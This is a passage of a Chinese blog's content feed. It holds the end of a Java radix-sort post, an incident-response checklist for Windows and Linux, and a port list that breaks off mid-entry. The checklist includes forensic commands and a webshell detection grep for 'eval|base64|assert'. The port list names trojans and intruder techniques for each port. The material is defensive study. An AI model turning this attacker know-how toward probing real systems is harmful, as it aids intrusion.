punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> digit <span class="token operator">=</span> <span class="token function">maxDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">radixSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> digit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> each<span class="token operator">:</span>arr<span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>max <span class="token operator">&lt;</span> each<span class="token punctuation">)</span> max <span class="token operator">=</span> each<span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>max<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token operator">++</span><span class="token punctuation">;</span>        max <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">radixSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> digit<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> radix <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bucket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>r<span class="token operator">-</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> d<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>d<span class="token operator">&lt;=</span>digit<span class="token punctuation">;</span>d<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> count <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>radix<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">getDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>            count<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>count<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> count<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>r<span class="token punctuation">;</span>i<span class="token operator">>=</span>l<span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">getDigit</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>            bucket<span class="token punctuation">[</span><span class="token operator">--</span>count<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>l<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> bucket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> digit<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>num<span class="token operator">/</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>digit<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急排查</title>
      <link href="/2021/09/26/%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/"/>
      <url>/2021/09/26/%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>windows &amp; linux 应急知识体系</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><p>时间 - 发生时间、恶意文件时间</p><p>地点 - 文件目录</p><p>事件 - 系统日志、web日志、历史记录</p><h3 id="尝试分析、溯源、模拟攻击"><a href="#尝试分析、溯源、模拟攻击" class="headerlink" title="尝试分析、溯源、模拟攻击"></a>尝试分析、溯源、模拟攻击</h3><h3 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h3><p>常见目录 - <code>/tmp, /var/tmp, /dev/shm, RECYCLER</code></p><p>手法 - 一句话木马、后门</p><p>恶意软件特征</p><h3 id="排查方式"><a href="#排查方式" class="headerlink" title="排查方式"></a>排查方式</h3><blockquote><p>事件类型  -  时间范围  -  文件排除  -  进程排除  -  系统信息 -  日志分析  -  入侵方式  -  解决办法</p></blockquote><h2 id="windows应急"><a href="#windows应急" class="headerlink" title="windows应急"></a>windows应急</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><p>基本信息 - msinfo32, systeminfo</p><p>用户 - net user（无法查看隐藏用户）</p><p>启动项 - msconfig, 注册表</p><p>计划任务 - compmgmt.msc, schtasks</p><h3 id="文件排查"><a href="#文件排查" class="headerlink" title="文件排查"></a>文件排查</h3><p>敏感目录， 后门文件</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>tasklist, netstat, powershell, wmic, 任务管理器</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>eventvwr</p><h2 id="linux应急"><a href="#linux应急" class="headerlink" title="linux应急"></a>linux应急</h2><h3 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">uname</span> -a<span class="token function">cat</span> /proc/versionlsmod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">useradd</span> userdel的命令时间变化，是否包含可疑信息<span class="token function">cat</span> /etc/passwd<span class="token environment constant">UID</span>为0登录用户 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">history</span><span class="token function">cat</span> /root/.bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>通过查看命令操作痕迹，可能关联到如下信息：</p><p><code>wget</code>远程某主机</p><p>尝试连接内网某主机<code>ssh scp</code> 便于分析攻击者意图</p><p>打包某敏感数据或代码， <code>tar zip</code>类命令</p><p>对系统进行配置，包括命令修改、远控木马类</p></blockquote><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">/etc/init.d/rc.local/etc/rc.local/etc/init.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">crontab</span> -l <span class="token comment">#列出计划任务</span><span class="token function">crontab</span> -e <span class="token comment">#编辑计划任务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ltunp <span class="token comment">#找出可疑PID</span><span class="token function">ls</span> -alh /proc/pid<span class="token function">lsof</span> -p pid<span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="时间点"><a href="#时间点" class="headerlink" title="时间点"></a>时间点</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> -mtime -n +n file-modify-time -n within-n-days +n before-n-days-atime -n +n file-access-time -n within-n-days +n before-n-days-ctime -n +n file-create-time -n within-n-days +n before-n-days<span class="token comment">#找出新增的文件</span><span class="token function">find</span> / -ctime <span class="token number">0</span> -name <span class="token string">".sh"</span><span class="token comment">#find webshell</span><span class="token function">find</span> /var/www/ -name <span class="token string">"*.php"</span> <span class="token operator">|</span> xray <span class="token function">egrep</span> <span class="token string">"eval|base64|assert"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span><span class="token punctuation">)</span>/var/log/secure <span class="token comment">#记录登录系统存取数据的文件;</span><span class="token comment">#例如:pop3，ssh，telnet，ftp等都会记录在此.</span><span class="token number">2</span><span class="token punctuation">)</span>/ar/log/btmp <span class="token comment">#记录登录的信息记录，被编码过，所以必须以last解析;</span>lastb <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123; print $3&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span class="token number">3</span><span class="token punctuation">)</span>/var/log/message <span class="token comment">#几乎所有的开机系统发生的错误都会在此记录;</span><span class="token number">4</span><span class="token punctuation">)</span>/var/log.boot.log <span class="token comment">#记录一些开机或者关机启动的一些服务显示的启动或者关闭的信息;</span><span class="token number">5</span><span class="token punctuation">)</span>/var/log/maillog <span class="token comment">#记录邮件的存取和往来;</span><span class="token number">6</span><span class="token punctuation">)</span>/var/log/cron <span class="token comment">#用来记录crontab这个服务的内容;</span><span class="token number">7</span><span class="token punctuation">)</span>/var/log/httpd, /var/log/mysqld.log 等等文件 <span class="token comment">#记录几个不同的网络服务的记录文件;</span><span class="token number">8</span><span class="token punctuation">)</span>/var/log/acpid <span class="token comment">#ACPI - Advanced Configuration and Power Interface，表示高级配置和电源管理接口,后面的 d 表示 deamon, acpid 也就是 the ACPI event daemon,也就是 acpi 的消息进程,用来控制、获取、管理 acpi 的状态的服务程序。</span><span class="token number">9</span><span class="token punctuation">)</span>/var/run/utmp <span class="token comment">#记录着现在登录的用户;</span><span class="token number">10</span><span class="token punctuation">)</span>/var/log/lastlog <span class="token comment">#记录每个用户最后的登录信息;</span><span class="token number">11</span><span class="token punctuation">)</span>/var/log/btmp <span class="token comment">#记录错误的登录尝试;</span><span class="token number">12</span><span class="token punctuation">)</span>/var/log/dmesg <span class="token comment">#内核日志;</span><span class="token number">13</span><span class="token punctuation">)</span>/var/log/cpus <span class="token comment">#CPU的处理信息；</span><span class="token number">14</span><span class="token punctuation">)</span>/var/log/syslog <span class="token comment">#事件记录监控程序日志；</span><span class="token number">15</span><span class="token punctuation">)</span>/var/log/auth.log <span class="token comment">#用户认证日志；</span><span class="token number">16</span><span class="token punctuation">)</span>/var/log/daemon.log <span class="token comment">#系统进程日志；</span><span class="token number">17</span><span class="token punctuation">)</span>/var/log/mail.err <span class="token comment">#邮件错误信息；</span><span class="token number">18</span><span class="token punctuation">)</span>/var/log/mail.info <span class="token comment">#邮件信息；</span><span class="token number">19</span><span class="token punctuation">)</span>/var/log/mail.warn <span class="token comment">#邮件警告信息；</span><span class="token number">20</span><span class="token punctuation">)</span>/var/log/daemon.log <span class="token comment">#系统监控程序产生的信息;</span><span class="token number">21</span><span class="token punctuation">)</span>/var/log/kern <span class="token comment">#内核产生的信息;</span><span class="token number">22</span><span class="token punctuation">)</span>/var/log/lpr <span class="token comment">#行打印机假脱机系统产生的信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3><ol><li>基于用户模式程序的内存获取 </li><li>基于内核模式程序的内存获取 </li><li>基于系统崩溃转储的内存获取 </li><li>基于操作系统注入的内存获取 </li><li>基于系统休眠文件的内存获取 </li><li>基于虚拟化快照的内存获取 </li><li>基于系统冷启动的内存获取 </li><li>基于硬件的内存获取</li></ol><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="SysinternalsSuite"><a href="#SysinternalsSuite" class="headerlink" title="SysinternalsSuite"></a>SysinternalsSuite</h3><p>工具的集合，里面的工具可以管理、故障分析和诊断你的 Windows系统和应用程序。你能想到的相关排查问题的功能，里面都涵盖了，里面的工具 太多，没有办法一一介绍，如使用AD Explorer轻松导航AD数据库，定义收藏位置，查看 对象属性和属性，而无需打开对话框，编辑权限，查看对象的架构，以及执行可以保存和重 新执行的复杂搜索；使用TCPView查看网络连接情况 ；使用PsExec在远程系统上启动交互 式命令提示和IpConfig等远程启用工具；使用Autoruns对进程，服务，启动项等进行检测；使用procdump对内存进行dump等等。更多工具功能可以在下面网址去查询相关的功能及 使用方法。<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a></p><h3 id="PCHunter"><a href="#PCHunter" class="headerlink" title="PCHunter"></a>PCHunter</h3><p>是一款强大的内核级监控软件，软件可以查看内核文件、驱动模块、隐藏进程、注册表, 内核，网络等等信息，和PCHunter功能相似的还有火绒剑，PowerTool等。具体的功能有下图所示 数字签名颜色说明：黑色：微软签名的驱动程序；蓝色：非微软签名的驱动程序；红色：驱动检测到的可疑对象，隐藏服务、进程、被挂钩函数；</p><h3 id="Process-monitor"><a href="#Process-monitor" class="headerlink" title="Process monitor"></a>Process monitor</h3><p>主要是监控进程的行为应用程序运行时使用此软件来监控程序的各种操作。此软 件主要监控程序的五种行为：文件系统，注册表，进程，网络，分析。由于此款软件监控的是系统中 所有的进程的行为，数据量往往很大，不利于我们分析数据，所以需要对其设置过滤选项，通过Filter- &gt;Filter选项可以看到右侧的窗口，在此窗口中增加过滤项。</p><h3 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h3><p>是一款检测系统安全的软件。查看，监视和分析跟事件记录，包括安全，系统，应 用程序和其他微软Windows 的记录被记载的事件。</p><h3 id="FullEventLogView"><a href="#FullEventLogView" class="headerlink" title="FullEventLogView"></a>FullEventLogView</h3><p>是一个轻量级的日志检索工具，特点是绿色版，免安装，同时检索功能比 windows自带的检索工具要快，展示要好。功能大家在用的时候探索一下就好，比较简单。</p><h3 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h3><p>是微软工程师写的一个日志分析工具，功能很强大，支持SQL 查询语法的 日志查询工具。</p><h2 id="勒索病毒及解密工具查询网站"><a href="#勒索病毒及解密工具查询网站" class="headerlink" title="勒索病毒及解密工具查询网站"></a>勒索病毒及解密工具查询网站</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">https:</span>//lesuobingdu.qianxin.com/ <span class="token header-name keyword">http:</span>//lesuobingdu.360.cn/ <span class="token header-name keyword">https:</span>//guanjia.qq.com/pr/ls/#navi_0 <span class="token header-name keyword">https:</span>//id-ransomware.malwarehunterteam.com/ <span class="token header-name keyword">https:</span>//www.nomoreransom.org/zh/index.html <span class="token header-name keyword">https:</span>//esupport.trendmicro.com/en-us/home/pages/technical-support/1114221.aspx <span class="token header-name keyword">https:</span>//noransom.kaspersky.com/ <span class="token header-name keyword">https:</span>//www.emsisoft.com/ransomware-decryption-tools/ <span class="token header-name keyword">https:</span>//www.avast.com/en-us/ransomware-decryption-tools <span class="token header-name keyword">https:</span>//www.quickheal.com/free-ransomware-decryption-tool/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见端口</title>
      <link href="/2021/09/26/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/"/>
      <url>/2021/09/26/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>端口：0<br>服务：Reserved<br>说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。 </p><p>端口：1<br>服务：tcpmux<br>说明：这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。 </p><p>端口：7<br>服务：Echo<br>说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。 </p><p>端口：19<br>服务：Character Generator<br>说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。 </p><p>端口：21<br>服务：FTP<br>说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口。 </p><p>端口：22<br>服务：Ssh<br>说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。 </p><p>端口：23<br>服务：Telnet<br>说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。 </p><p>端口：25<br>服务：SMTP<br>说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。 </p><p>端口：31<br>服务：MSG Authentication<br>说明：木马Master Paradise、Hackers Paradise开放此端口。 </p><p>端口：42<br>服务：WINS Replication<br>说明：WINS复制 </p><p>端口：53<br>服务：Domain Name Server（DNS）<br>说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。 </p><p>端口：67<br>服务：Bootstrap Protocol Server<br>说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。 </p><p>端口：69<br>服务：Trival File Transfer<br>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。 </p><p>端口：79<br>服务：Finger Server<br>说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。 </p><p>端口：80<br>服务：HTTP<br>说明：用于网页浏览。木马Executor开放此端口。 </p><p>端口：99<br>服务：Metagram Relay<br>说明：后门程序ncx99开放此端口。 </p><p>端口：102<br>服务：Message transfer agent(MTA)-X.400 over TCP/IP<br>说明：消息传输代理。 </p><p>端口：109<br>服务：Post Office Protocol -Version3<br>说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。 </p><p>端口：110<br>服务：SUN公司的RPC服务所有端口<br>说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等 </p><p>端口：113<br>服务：Authentication Service<br>说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。 </p><p>端口：119<br>服务：Network News Transfer Protocol<br>说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。 </p><p>端口：135<br>服务：Location Service<br>说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。 </p><p>端口：137、138、139<br>服务：NETBIOS Name Service<br>说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。 </p><p>端口：143<br>服务：Interim Mail Access Protocol v2<br>说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。 </p><p>端口：161<br>服务：SNMP<br>说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。 </p><p>端口：177<br>服务：X Display Manager Control Protocol<br>说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。 </p><p>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。 </p><p>端口：443<br>服务：Https<br>说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。 </p><p>端口：456<br>服务：[NULL]<br>说明：木马HACKERS PARADISE开放此端口。 </p><p>端口：513<br>服务：Login,remote login<br>说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。 </p><p>端口：544<br>服务：[NULL]<br>说明：kerberos kshell</p><p>端口：548<br>服务：Macintosh,File Services(AFP/IP)<br>说明：Macintosh,文件服务。 </p><p>端口：553<br>服务：CORBA IIOP （UDP）<br>说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。 </p><p>端口：555<br>服务：DSF<br>说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。 </p><p>端口：568<br>服务：Membership DPA<br>说明：成员资格 DPA。 </p><p>端口：569<br>服务：Membership MSN<br>说明：成员资格 MSN。 </p><p>端口：635<br>服务：mountd<br>说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。 </p><p>端口：636<br>服务：LDAP<br>说明：SSL（Secure Sockets layer） </p><p>端口：666<br>服务：Doom Id Software<br>说明：木马Attack FTP、Satanz Backdoor开放此端口 </p><p>端口：993<br>服务：IMAP<br>说明：SSL（Secure Sockets layer） </p><p>端口：1001、1011<br>服务：[NULL]<br>说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。 </p><p>端口：1024<br>服务：Reserved<br>说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。 </p><p>端口：1025、1033<br>服务：1025：network blackjack 1033：[NULL]<br>说明：木马netspy开放这2个端口。 </p><p>端口：1080<br>服务：SOCKS<br>说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。<br>端口：1170<br>服务：[NULL]<br>说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。 </p><p>端口：1234、1243、6711、6776<br>服务：[NULL]<br>说明：木马SubSeven2.0、Ultors 